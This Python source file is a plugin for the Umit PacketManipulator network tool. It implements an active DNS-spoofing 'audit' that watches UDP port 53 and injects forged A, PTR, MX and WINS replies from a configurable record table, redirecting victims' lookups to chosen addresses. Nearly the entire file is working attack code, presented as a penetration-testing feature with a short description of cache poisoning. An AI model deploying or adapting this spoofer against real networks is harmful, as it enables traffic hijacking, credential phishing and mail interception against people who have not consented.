#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Copyright (C) 2008 Adriano Monteiro Marques
#
# Author: Francesco Piccinno <stack.box@gmail.com>
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA

"""
DNS-spoof (Active audit)

It supports spoofing of A, PTR, MX and WINS DNS records.

DNS WINS records reference is at:
- http://www.watersprings.org/pub/id/draft-levone-dns-wins-lookup-01.txt
"""

import gtk
import gobject

from struct import pack
from fnmatch import fnmatch
from socket import inet_aton

from umit.pm.core.i18n import _
from umit.pm.core.logger import log
from umit.pm.core.auditutils import is_ip, AuditOperation
from umit.pm.core.const import STATUS_INFO
from umit.pm.manager.auditmanager import *
from umit.pm.manager.sessionmanager import SessionManager
from umit.pm.backend import MetaPacket

AUDIT_NAME = 'dns-spoof'
AUDIT_MSG = '<tt><b>' + AUDIT_NAME + ':</b> %s</tt>'

RECORD_A,   \
RECORD_PTR, \
RECORD_MX,  \
RECORD_WINS = range(4)

DNS_TYPES = {
    1  : RECORD_A,
    12 : RECORD_PTR,
    15 : RECORD_MX,
    0xFF01 : RECORD_WINS
}

OPCODE_QUERY = 0
CLASS_IN = 1

strlen = lambda x: pack('b', x)

def dotted(x):
    a = x.split('.')

    return ''.join(
        map(lambda x: strlen(x[0]) + x[1],
            zip(map(len, a), a)
        )
    )

def sanitize_rdata(name, qname):
    # I have to workaround the situation in this way.
    # See also http://trac.secdev.org/scapy/ticket/303

    orig = qname.split('.')
    curr = name.split('.')

    a, b = '', ''
    while orig and curr:
        a = orig.pop(-1)
        b = curr.pop(-1)

        if a != b:
            break

    idx = name.find(b) - 1

    if idx <= 0:
        idx = name.rfind('.')

    if idx <= 0:
        return dotted(name + '.' + qname) + '\x00'

    return dotted(name) + '\x00'

class DNSSpoofOperation(AuditOperation):
    has_stop = True
    has_start = True

    def __init__(self):
        AuditOperation.__init__(self)
        self.packets = 0
        self.summary = AUDIT_MSG % _('waiting for packets ...')

    def start(self):
        if self.state == self.RUNNING:
            return False

        self.state = self.RUNNING
        return True

    def stop(self):
        if self.state == self.NOT_RUNNING:
            return False

        self.packets = 0
        self.state = self.NOT_RUNNING
        return True

class DNSSpoof(ActiveAudit):
    def start(self, reader):
        manager = AuditManager()
        contents = manager.get_configuration(AUDIT_NAME)['records']

        self.dns_db = [[], [], [], []]

        for line in contents.splitlines():
            line = line.strip()

            if not line or line[0] == '#':
                continue

            try:
                record, type, ip = line.split(' ', 2)

                record = record.strip()
                type = ['A', 'PTR', 'MX', 'WINS'].index(type.strip().upper())
                ip = ip.strip()

            except Exception, err:
                log.warning('Not a valid record %s' % line)
                continue

            wildcard = '*' in record

            if type == RECORD_PTR and wildcard:
                log.warning('PTR record could not have wildcard (%s %s %s)' \
                            % (record, type, ip))
                continue

            if type != RECORD_MX and not is_ip(ip):
                log.warning('Not a valid IP address (%s)' % ip)
                continue

            log.debug('Adding %s %s with type %d' % (record, ip, type))
            self.dns_db[type].append((record, ip))

        a, self.item = self.add_menu_entry('DNSSpoof', 'DNS Spoof',
                                           _('Start a DNS spoofing attack'),
                                           gtk.STOCK_EXECUTE)
        self.operation = None

    def stop(self):
        self.remove_menu_entry(self.item)

        manager = AuditManager()
        manager.remove_dissector(APP_LAYER_UDP, 53, self.dns_decoder)

    def execute_audit(self, sess, inp_dict):
        if self.operation:
            return False

        self.session = sess
        self.operation = DNSSpoofOperation()

        return self.operation

    def register_decoders(self):
        log.debug('Registering 53/udp dissector')

        manager = AuditManager()
        manager.add_dissector(APP_LAYER_UDP, 53, self.dns_decoder)

    def dns_decoder(self, mpkt):
        if not self.operation:
            return

        if self.operation.state == self.operation.NOT_RUNNING:
            return

        if not mpkt.get_field('dns'):
            return

        # We only want IN query
        if mpkt.get_field('dns.qd.qclass') != CLASS_IN:
            return

        if not mpkt.get_field('dns.an') and \
           mpkt.get_field('dns.opcode', 0) == OPCODE_QUERY and \
           mpkt.get_field('dns.qdcount') == 1 and \
           mpkt.get_field('dns.ancount', 0) == 0:

            # Ok this packet is a DNS query.

            type = mpkt.get_field('dns.qd.qtype')

            if type not in DNS_TYPES:
                return

            qname = mpkt.get_field('dns.qd.qname')
            type = DNS_TYPES[type]

            log.debug('TYPE' + str(type))

            if type == RECORD_PTR:
                name, ip = self.get_ptr(mpkt, qname)

                if not name:
                    return

                ans = MetaPacket.new('dnsrr')
                ans.set_field('dnsrr.rrname', qname)
                ans.set_field('dnsrr.type', 12)
                ans.set_field('dnsrr.rclass', CLASS_IN)
                ans.set_field('dnsrr.ttl', 3600) # 1 hour
                ans.set_field('dnsrr.rdata', sanitize_rdata(name, qname[:-1]))

                pkt = self.dns_packet(mpkt, ans)

                self.session.context.si_l3(pkt)
                self.update_operation(
                    _('Redirecting %s -> PTR reply %s is %s') % \
                        (mpkt.get_source(), ip, name),
                    STATUS_INFO
                )

            elif type == RECORD_A:
                record, ip = self.get_generic(mpkt, qname[:-1], RECORD_A)

                if not ip:
                    return

                ans = MetaPacket.new('dnsrr')
                ans.set_field('dnsrr.rrname', qname)
                ans.set_field('dnsrr.type', 1)
                ans.set_field('dnsrr.rclass', CLASS_IN)
                ans.set_field('dnsrr.ttl', 3600)
                ans.set_field('dnsrr.rdata', ip)

                pkt = self.dns_packet(mpkt, ans)

                self.session.context.si_l3(pkt)
                self.update_operation(
                    _('Redirecting %s -> A reply %s is %s') % \
                        (mpkt.get_source(), qname[:-1], ip),
                    STATUS_INFO
                )

            elif type == RECORD_MX:
                record, host = self.get_generic(mpkt, qname[:-1], RECORD_MX)

                if not host:
                    return

                ans = MetaPacket.new('dnsrr')
                ans.set_field('dnsrr.rrname', qname)
                ans.set_field('dnsrr.type', 15)
                ans.set_field('dnsrr.rclass', CLASS_IN)
                ans.set_field('dnsrr.ttl', 3600)
                ans.set_field('dnsrr.rdata',
                    "\x00\x0a" + # Hightest priority
                    sanitize_rdata(host, qname[:-1]))

                pkt = self.dns_packet(mpkt, ans)

                self.session.context.si_l3(pkt)
                self.update_operation(
                    _('Redirecting %s -> MX reply %s is %s') % \
                        (mpkt.get_source(), qname[:-1], host + '.' + qname[:-1]),
                    STATUS_INFO
                )
            elif type == RECORD_WINS:
                record, ip = self.get_generic(mpkt, qname[:-1], RECORD_WINS)

                if not ip:
                    log.debug('No records found for WINS')
                    return

                log.debug(ip)

                ans = MetaPacket.new('dnsrr')
                ans.set_field('dnsrr.rrname', qname)
                ans.set_field('dnsrr.type', 0xFF01)
                ans.set_field('dnsrr.rclass', CLASS_IN)
                ans.set_field('dnsrr.ttl', 3600)
                ans.set_field('dnsrr.rdata',
                    pack("!IIII",
                         0x00010000, # Local flag
                         5, # 5 seconds of Lookup timeout
                         3600, # 3600 seconds of Cache timeout
                         1) + # Numbers of WINS server
                         inet_aton(ip) + '\x00'
                )

                pkt = self.dns_packet(mpkt, ans)

                self.session.context.si_l3(pkt)
                self.update_operation(
                    _('Redirecting %s -> WINS reply %s is %s') % \
                        (mpkt.get_source(), qname, ip),
                    STATUS_INFO
                )

    def dns_packet(self, mpkt, ans):
        pkt = MetaPacket.new('ip') / MetaPacket.new('udp') / MetaPacket.new('dns')
        pkt.set_field('ip.src', mpkt.get_field('ip.dst'))
        pkt.set_field('ip.dst', mpkt.get_field('ip.src'))
        pkt.set_field('udp.sport', mpkt.get_field('udp.dport'))
        pkt.set_field('udp.dport', mpkt.get_field('udp.sport'))
        pkt.set_field('dns.id', mpkt.get_field('dns.id'))
        pkt.set_field('dns.qd', mpkt.get_field('dns.qd'))
        pkt.set_field('dns.qr', 1)
        pkt.set_field('dns.qdcount', 1)
        pkt.set_field('dns.opcode', 16)
        pkt.set_field('dns.an', ans)

        return pkt

    def update_operation(self, msg, severity):
        self.operation.packets += 1
        self.operation.summary = AUDIT_MSG % \
            (_('%d sent') % self.operation.packets)

        self.operation.percentage = \
            (self.operation.percentage + 536870911) % \
            gobject.G_MAXINT

        self.session.output_page.user_msg(msg, severity, AUDIT_NAME)

    def get_generic(self, mpkt, qname, type):
        for record, ip in self.dns_db[type]:
            if fnmatch(qname, record):
                return record, ip

        return None, None

    def get_ptr(self, mpkt, qname):
        name = qname
        name = name.replace('.in-addr.arpa.', '')
        name = name.split('.')
        name.reverse()

        cip = '.'.join(name)

        for record, ip in self.dns_db[RECORD_PTR]:
            if ip == cip:
                return record, ip

        return (None, None)

__plugins__ = [DNSSpoof]
__plugins_deps__ = [('DNSSpoof', ['UDPDecoder'], ['DNSSpoof-1.0'], []),]

__audit_type__ = 1
__protocols__ = (('udp', 53), ('dns', None))
__configurations__ = ((AUDIT_NAME, {
    'records' : [
"""# Here you could insert DNS records
# The syntax is:
#  record type host
# record: is a string like manipulator.umitproject.org or a wildcarded
# string like *.umitproject.org.
# type: could be A, MX, WINS, PTR (For PTR wildcarded record is not allowed)
# host: is an IP address in dotted form or hostname""", 'UDP records'],
    }),
)
__vulnerabilities__ = (('DNS spoofing', {
    'description' : 'DNS cache poisoning is a maliciously created or '
                    'unintended situation that provides data to a caching name '
                    'server that did not originate from authoritative Domain '
                    'Name System (DNS) sources. This can happen through '
                    'improper software design, misconfiguration of name '
                    'servers, and maliciously designed scenarios exploiting '
                    'the traditionally open-architecture of the DNS system. '
                    'Once a DNS server has received such non-authentic data '
                    'and caches it for future performance increase, it is '
                    'considered poisoned, supplying the non-authentic data to '
                    'the clients of the server.\n\n'
                    'A domain name server translates a domain name (such as '
                    'www.example.com) into an IP Address that Internet hosts '
                    'use to contact Internet resources. If a DNS server is '
                    'poisoned, it may return an incorrect IP Address, '
                    'diverting traffic to another computer.',
    'references' : ((None, 'http://en.wikipedia.org/wiki/'
                            'DNS_cache_poisoning'),)
    }),
)
